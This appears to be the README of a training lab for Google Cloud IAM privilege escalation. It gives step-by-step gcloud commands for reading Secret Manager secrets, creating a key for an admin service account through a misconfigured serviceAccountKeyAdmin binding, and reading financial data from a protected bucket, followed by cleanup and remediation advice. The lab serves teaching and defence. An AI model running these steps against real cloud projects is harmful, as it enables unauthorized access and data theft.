# IAM Privilege Escalation

Exploit IAM policy misconfiguration to escalate privileges and access protected GCS data.

## Objectives

- Enumerate service account permissions and identify overly permissive IAM bindings
- Exploit misconfigured serviceAccountKeyAdmin role for privilege escalation
- Access protected Cloud Storage resources after escalation

## MITRE ATT&CK

- T1078.004 - Valid Accounts: Cloud Accounts
- T1098.001 - Account Manipulation: Additional Cloud Credentials
- T1530 - Data from Cloud Storage Object

## Architecture

- Developer service account with programmatic access and self-service key management
- Project-level IAM binding with misconfigured serviceAccountKeyAdmin granting access to all service accounts
- Protected GCS bucket containing financial data
- Secret Manager with configuration data
- Admin automation service account with Storage Admin permissions

## Walkthrough

### 1. Configure credentials

Save the service account key and activate it:

```bash
terraform output -raw developer_key_json > developer-key.json
gcloud auth activate-service-account --key-file=developer-key.json
gcloud config set project <project-id>
```

### 2. Enumerate current identity

```bash
gcloud auth list
gcloud config get-value account
```

### 3. List service accounts in the project

```bash
gcloud iam service-accounts list
```

Note the admin automation service account.

### 4. Examine your IAM bindings

```bash
gcloud projects get-iam-policy <project-id> \
  --flatten="bindings[].members" \
  --filter="bindings.members:$(gcloud config get-value account)" \
  --format="table(bindings.role)"
```

The misconfiguration: `roles/iam.serviceAccountKeyAdmin` is granted at the project level, allowing key creation for any service account.

### 5. Check Secret Manager for hints

```bash
gcloud secrets list
gcloud secrets versions access latest --secret=<secret-id>
```

### 6. Create a key for the admin service account

```bash
gcloud iam service-accounts keys create admin-key.json \
  --iam-account=<admin-sa-email>
```

### 7. Activate the admin service account

```bash
gcloud auth activate-service-account --key-file=admin-key.json
```

### 8. Verify escalation

```bash
gcloud auth list
gcloud projects get-iam-policy <project-id> \
  --flatten="bindings[].members" \
  --filter="bindings.members:$(gcloud config get-value account)" \
  --format="table(bindings.role)"
```

You should now have `roles/storage.admin`.

### 9. Access protected data

```bash
gcloud storage ls
gcloud storage ls gs://<protected-bucket>/
gcloud storage cat gs://<protected-bucket>/financial/q4-2024-revenue.csv
```

### 10. Cleanup

Delete the escalation key and reactivate the developer account:

```bash
gcloud iam service-accounts keys list --iam-account=<admin-sa-email>
gcloud iam service-accounts keys delete <key-id> --iam-account=<admin-sa-email>
gcloud auth activate-service-account --key-file=developer-key.json
rm admin-key.json
```

## Remediation

- Use IAM conditions to restrict serviceAccountKeyAdmin to specific service accounts
- Implement organization policies to disable service account key creation
- Use Workload Identity Federation instead of service account keys
- Alert on service account key creation via Cloud Audit Logs
- Use IAM Recommender to identify overly permissive bindings

## References

- https://cloud.google.com/iam/docs/understanding-roles#iam.serviceAccountKeyAdmin
- https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/
- https://cloud.google.com/iam/docs/conditions-overview
